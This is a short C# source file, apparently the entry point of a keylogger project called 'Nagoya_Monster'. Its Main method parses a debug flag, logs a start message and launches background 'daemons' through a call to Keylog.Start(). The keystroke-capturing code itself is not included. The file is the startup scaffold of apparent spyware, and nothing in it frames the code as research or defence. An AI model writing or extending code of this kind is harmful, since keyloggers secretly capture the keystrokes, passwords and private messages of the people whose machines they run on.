using System;

namespace Nagoya_Monster
{
    class Program
    {
        private const bool isRelease = false;
        public static bool isDebugging;
        public static bool isRunning = true;  

        private static void Main(string[] args)
        {
            ManageArgs(args);
            Log.Add("Nagoya Monster Started");
            StartDeamons();
        }

        private static void ManageArgs(string[] args)
        {
            if (args.Length > 0)
            {
                if (args[0] == "debug")
                {
                    if (isRelease)
                    {
                        #pragma warning disable CS0162 // Unreachable code detected
                        Environment.Exit(0);
                        #pragma warning restore CS0162 // Unreachable code detected
                    }
                    isDebugging = true;
                }
                else
                {
                    isDebugging = true;
                }
            }
        }

        private static void StartDeamons()
        {
            Log.Add("Nagoya Monster Started");
            Keylog.Start();
        }
    }
}
